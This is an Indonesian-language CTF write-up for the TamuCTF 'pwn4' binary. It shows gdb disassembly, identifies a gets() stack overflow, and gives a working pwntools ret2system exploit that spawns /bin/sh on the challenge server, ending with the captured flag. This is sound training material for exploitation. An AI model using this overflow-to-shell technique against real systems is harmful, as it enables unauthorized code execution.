# pwn4

TamuCTF - Disklaim :(Writeup ini punya keuorac https://ctftime.org/writeup/8958)


Didapatkan suatu file .ELF, pertama-tama yang saya lakukan adalah ```checksec``` file tersebut :
```
blaccmail@localhost:~/Downloads$ checksec pwn4
[*] '/home/blaccmail/Downloads/pwn4'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE
blaccmail@localhost:~/Downloads$ 
```

Oke, terlihat diatas NX nya aktif. NX atau No Execution menentukan memori mana saja yang bisa menjalankan kode jadi kita tidak bisa memasukkan kode kita sendiri.

selanjutnya kita akan lihat fungsi apa saja yang ada di program tersebut di gdb dengan ```info functions``` :
```
blaccmail@localhost:~/Downloads$ gdb pwn4
gdb-peda$ b main
Breakpoint 1 at 0x8048791
gdb-peda$ info functions
All defined functions:

Non-debugging symbols:
0x080483b4  _init
0x080483f0  strcmp@plt
0x08048400  printf@plt
0x08048410  gets@plt
0x08048420  puts@plt
0x08048430  system@plt
0x08048440  exit@plt
0x08048450  __libc_start_main@plt
0x08048460  setvbuf@plt
0x08048470  putchar@plt
0x08048490  _start
0x080484c0  __x86.get_pc_thunk.bx
0x080484d0  deregister_tm_clones
0x08048500  register_tm_clones
0x08048540  __do_global_dtors_aux
0x08048560  frame_dummy
0x0804858b  ls
0x080485a4  cal
0x080485bd  pwd
0x080485d6  whoami
0x080485ef  reduced_shell
0x08048783  main
0x080487b0  __libc_csu_init
0x08048810  __libc_csu_fini
0x08048814  _fini
gdb-peda$ 
```

kita temukan suatu fungsi bernama ```rduced_shell```, berikut isinya :
```
gdb-peda$ disass reduced_shell
Dump of assembler code for function reduced_shell:
   0x080485ef <+0>:	push   ebp
   0x080485f0 <+1>:	mov    ebp,esp
   0x080485f2 <+3>:	sub    esp,0x28
   0x080485f5 <+6>:	sub    esp,0xc
   0x080485f8 <+9>:	push   0x8048842
   0x080485fd <+14>:	call   0x8048420 <puts@plt>
   0x08048602 <+19>:	add    esp,0x10
   0x08048605 <+22>:	sub    esp,0xc
   0x08048608 <+25>:	push   0x804885e
   0x0804860d <+30>:	call   0x8048420 <puts@plt>
   0x08048612 <+35>:	add    esp,0x10
   0x08048615 <+38>:	sub    esp,0xc
   0x08048618 <+41>:	push   0x8048870
   0x0804861d <+46>:	call   0x8048420 <puts@plt>
   0x08048622 <+51>:	add    esp,0x10
   0x08048625 <+54>:	sub    esp,0xc
   0x08048628 <+57>:	push   0x8048896
   0x0804862d <+62>:	call   0x8048400 <printf@plt>
   0x08048632 <+67>:	add    esp,0x10
   0x08048635 <+70>:	sub    esp,0xc
   0x08048638 <+73>:	lea    eax,[ebp-0x1c]
   0x0804863b <+76>:	push   eax
   0x0804863c <+77>:	call   0x8048410 <gets@plt>
   0x08048641 <+82>:	add    esp,0x10
   0x08048644 <+85>:	sub    esp,0x8
   0x08048647 <+88>:	push   0x8048830
   0x0804864c <+93>:	lea    eax,[ebp-0x1c]
   0x0804864f <+96>:	push   eax
   0x08048650 <+97>:	call   0x80483f0 <strcmp@plt>
   0x08048655 <+102>:	add    esp,0x10
   0x08048658 <+105>:	test   eax,eax
   0x0804865a <+107>:	je     0x8048674 <reduced_shell+133>
   0x0804865c <+109>:	sub    esp,0x8
   0x0804865f <+112>:	push   0x804889e
   0x08048664 <+117>:	lea    eax,[ebp-0x1c]
   0x08048667 <+120>:	push   eax
   0x08048668 <+121>:	call   0x80483f0 <strcmp@plt>
   0x0804866d <+126>:	add    esp,0x10
   0x08048670 <+129>:	test   eax,eax
   0x08048672 <+131>:	jne    0x804867e <reduced_shell+143>
   0x08048674 <+133>:	call   0x804858b <ls>
   0x08048679 <+138>:	jmp    0x8048773 <reduced_shell+388>
   0x0804867e <+143>:	sub    esp,0x8
   0x08048681 <+146>:	push   0x8048833
   0x08048686 <+151>:	lea    eax,[ebp-0x1c]
   0x08048689 <+154>:	push   eax
   0x0804868a <+155>:	call   0x80483f0 <strcmp@plt>
   0x0804868f <+160>:	add    esp,0x10
   0x08048692 <+163>:	test   eax,eax
   0x08048694 <+165>:	je     0x80486ae <reduced_shell+191>
   0x08048696 <+167>:	sub    esp,0x8
   0x08048699 <+170>:	push   0x80488a0
   0x0804869e <+175>:	lea    eax,[ebp-0x1c]
   0x080486a1 <+178>:	push   eax
   0x080486a2 <+179>:	call   0x80483f0 <strcmp@plt>
   0x080486a7 <+184>:	add    esp,0x10
   0x080486aa <+187>:	test   eax,eax
   0x080486ac <+189>:	jne    0x80486b8 <reduced_shell+201>
   0x080486ae <+191>:	call   0x80485a4 <cal>
   0x080486b3 <+196>:	jmp    0x8048773 <reduced_shell+388>
   0x080486b8 <+201>:	sub    esp,0x8
   0x080486bb <+204>:	push   0x8048837
   0x080486c0 <+209>:	lea    eax,[ebp-0x1c]
   0x080486c3 <+212>:	push   eax
   0x080486c4 <+213>:	call   0x80483f0 <strcmp@plt>
   0x080486c9 <+218>:	add    esp,0x10
   0x080486cc <+221>:	test   eax,eax
   0x080486ce <+223>:	je     0x80486e8 <reduced_shell+249>
   0x080486d0 <+225>:	sub    esp,0x8
   0x080486d3 <+228>:	push   0x80488a2
   0x080486d8 <+233>:	lea    eax,[ebp-0x1c]
   0x080486db <+236>:	push   eax
   0x080486dc <+237>:	call   0x80483f0 <strcmp@plt>
   0x080486e1 <+242>:	add    esp,0x10
   0x080486e4 <+245>:	test   eax,eax
   0x080486e6 <+247>:	jne    0x80486f2 <reduced_shell+259>
   0x080486e8 <+249>:	call   0x80485bd <pwd>
   0x080486ed <+254>:	jmp    0x8048773 <reduced_shell+388>
   0x080486f2 <+259>:	sub    esp,0x8
   0x080486f5 <+262>:	push   0x804883b
   0x080486fa <+267>:	lea    eax,[ebp-0x1c]
   0x080486fd <+270>:	push   eax
   0x080486fe <+271>:	call   0x80483f0 <strcmp@plt>
   0x08048703 <+276>:	add    esp,0x10
   0x08048706 <+279>:	test   eax,eax
   0x08048708 <+281>:	je     0x8048722 <reduced_shell+307>
   0x0804870a <+283>:	sub    esp,0x8
   0x0804870d <+286>:	push   0x80488a4
   0x08048712 <+291>:	lea    eax,[ebp-0x1c]
   0x08048715 <+294>:	push   eax
   0x08048716 <+295>:	call   0x80483f0 <strcmp@plt>
   0x0804871b <+300>:	add    esp,0x10
   0x0804871e <+303>:	test   eax,eax
   0x08048720 <+305>:	jne    0x8048729 <reduced_shell+314>
   0x08048722 <+307>:	call   0x80485d6 <whoami>
   0x08048727 <+312>:	jmp    0x8048773 <reduced_shell+388>
   0x08048729 <+314>:	sub    esp,0x8
   0x0804872c <+317>:	push   0x80488a6
   0x08048731 <+322>:	lea    eax,[ebp-0x1c]
   0x08048734 <+325>:	push   eax
   0x08048735 <+326>:	call   0x80483f0 <strcmp@plt>
   0x0804873a <+331>:	add    esp,0x10
   0x0804873d <+334>:	test   eax,eax
   0x0804873f <+336>:	je     0x8048759 <reduced_shell+362>
   0x08048741 <+338>:	sub    esp,0x8
   0x08048744 <+341>:	push   0x80488ab
   0x08048749 <+346>:	lea    eax,[ebp-0x1c]
   0x0804874c <+349>:	push   eax
   0x0804874d <+350>:	call   0x80483f0 <strcmp@plt>
   0x08048752 <+355>:	add    esp,0x10
   0x08048755 <+358>:	test   eax,eax
   0x08048757 <+360>:	jne    0x8048763 <reduced_shell+372>
   0x08048759 <+362>:	sub    esp,0xc
   0x0804875c <+365>:	push   0x0
   0x0804875e <+367>:	call   0x8048440 <exit@plt>
   0x08048763 <+372>:	sub    esp,0xc
   0x08048766 <+375>:	push   0x80488ad
   0x0804876b <+380>:	call   0x8048420 <puts@plt>
   0x08048770 <+385>:	add    esp,0x10
   0x08048773 <+388>:	sub    esp,0xc
   0x08048776 <+391>:	push   0xa
   0x08048778 <+393>:	call   0x8048470 <putchar@plt>
   0x0804877d <+398>:	add    esp,0x10
   0x08048780 <+401>:	nop
   0x08048781 <+402>:	leave  
   0x08048782 <+403>:	ret    
End of assembler dump.
gdb-peda$ 
```
Sepertinya program diatas mengunakan function ```gets``` untuk menerima inputan, seperti biasa ```gets``` sangatlah rentan dengan buffer overflow dikarenakan beliau tidak memerilsa size inputan yang diterimanya. Dari sini kita sudah mendapatkan gambaran untuk apa yang harus dilakukan,
```
-> Cari variable yang di overflow
-> Manipulasi return address
-> Panggil shell
```

Potongan baris ini menunjukkan ```ebp-0x1c``` merupakan variabel sasaran kita :
```
0x08048638 <+73>:	lea    eax,[ebp-0x1c]
```

kemudian kita akan cari alamat return untuk memanggil shell :
```
gdb-peda$ disass cal
Dump of assembler code for function cal:
   0x080485a4 <+0>:	push   ebp
   0x080485a5 <+1>:	mov    ebp,esp
   0x080485a7 <+3>:	sub    esp,0x8
   0x080485aa <+6>:	sub    esp,0xc
   0x080485ad <+9>:	push   0x8048833
   0x080485b2 <+14>:	call   0x8048430 <system@plt>
   0x080485b7 <+19>:	add    esp,0x10
   0x080485ba <+22>:	nop
   0x080485bb <+23>:	leave  
   0x080485bc <+24>:	ret    
End of assembler dump.
gdb-peda$ disass ls
Dump of assembler code for function ls:
   0x0804858b <+0>:	push   ebp
   0x0804858c <+1>:	mov    ebp,esp
   0x0804858e <+3>:	sub    esp,0x8
   0x08048591 <+6>:	sub    esp,0xc
   0x08048594 <+9>:	push   0x8048830
   0x08048599 <+14>:	call   0x8048430 <system@plt>
   0x0804859e <+19>:	add    esp,0x10
   0x080485a1 <+22>:	nop
   0x080485a2 <+23>:	leave  
   0x080485a3 <+24>:	ret    
End of assembler dump.
gdb-peda$ disass whoami
Dump of assembler code for function whoami:
   0x080485d6 <+0>:	push   ebp
   0x080485d7 <+1>:	mov    ebp,esp
   0x080485d9 <+3>:	sub    esp,0x8
   0x080485dc <+6>:	sub    esp,0xc
   0x080485df <+9>:	push   0x804883b
   0x080485e4 <+14>:	call   0x8048430 <system@plt>
   0x080485e9 <+19>:	add    esp,0x10
   0x080485ec <+22>:	nop
   0x080485ed <+23>:	leave  
   0x080485ee <+24>:	ret    
End of assembler dump.
gdb-peda$ 
```
potongan diatas merupakan hasil disass dari ketiga funtion yang berbeda, ternyata mereka memiliki kesamaan yaitu memanggil function ```system@plt``` oleh karena itu kita akan menggunakan alamat function tersebut :
```
0x8048430 <system@plt>
```

selanjutnya kita akan menuliskan shell kedalam payload kita, namun karena ```ebp-0x1c``` adalah variabel kita tidak dapat memasukkan string kedalamnya melainkan alamat dari process shell tersebut. Untuk menemukan process tersebut kita dapat cari dengan ```info proc mapping``` lalu cari ```/bin/sh``` :
```
gdb-peda$ b main
Breakpoint 1 at 0x8048791
gdb-peda$ r
Starting program: /home/blaccmail/Downloads/pwn4 
gdb-peda$ info proc mapping
process 2995
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/blaccmail/Downloads/pwn4
	 0x8049000  0x804a000     0x1000        0x0 /home/blaccmail/Downloads/pwn4
	 0x804a000  0x804b000     0x1000     0x1000 /home/blaccmail/Downloads/pwn4
	0xf7dc4000 0xf7f91000   0x1cd000        0x0 /lib/i386-linux-gnu/libc-2.26.so
	0xf7f91000 0xf7f92000     0x1000   0x1cd000 /lib/i386-linux-gnu/libc-2.26.so
	0xf7f92000 0xf7f94000     0x2000   0x1cd000 /lib/i386-linux-gnu/libc-2.26.so
	0xf7f94000 0xf7f95000     0x1000   0x1cf000 /lib/i386-linux-gnu/libc-2.26.so
	0xf7f95000 0xf7f98000     0x3000        0x0 
	0xf7fd0000 0xf7fd2000     0x2000        0x0 
	0xf7fd2000 0xf7fd5000     0x3000        0x0 [vvar]
	0xf7fd5000 0xf7fd7000     0x2000        0x0 [vdso]
	0xf7fd7000 0xf7ffc000    0x25000        0x0 /lib/i386-linux-gnu/ld-2.26.so
	0xf7ffc000 0xf7ffd000     0x1000    0x24000 /lib/i386-linux-gnu/ld-2.26.so
	0xf7ffd000 0xf7ffe000     0x1000    0x25000 /lib/i386-linux-gnu/ld-2.26.so
	0xfffdd000 0xffffe000    0x21000        0x0 [stack]
gdb-peda$ find '/bin/sh' 0x8048000 0x804b000
Searching for '/bin/sh' in range: 0x8048000 - 0x804b000
Found 1 results, display max 1 items:
pwn4 : 0x804a038 ("/bin/sh") 
```
Alamat dari proses '/bin/sh' (shell) adalah 0x804a038

dari sini kita bisa buat exploitnya dengan pwntools :
```
from pwn import *

p = remote("pwn.ctf.tamu.edu", 4324)

print p.recv(2048)

syspltaddr = p32(0x8048430)
shelladdr = p32(0x804a038)

payload = "a"*32 + syspltaddr + "a"*4 + shelladdr

p.send(payload)
p.interactive()
```

```FLOW : Jebol ebx-0x1c -> (masuk eip)Rewrite address ke system@plt -> menuhin buffer -> return/panggil shell```
sekarang kita tes ke server soal:
```
blaccmail@localhost:~/Downloads$ python pwn4_exploit.py 
[+] Opening connection to pwn.ctf.tamu.edu on port 4324: Done
I am a reduced online shell
Your options are:
1. ls
2. cal
3. pwd
4. whoami
5. exit
Input> 
[*] Switching to interactive mode
$ ls
Unkown Command

$ ls
flag.txt
pwn4
$ cat flag.txt
gigem{b4ck_70_7h3_l1br4ry}
```

berhasil :)

# Flag : gigem{b4ck_70_7h3_l1br4ry}

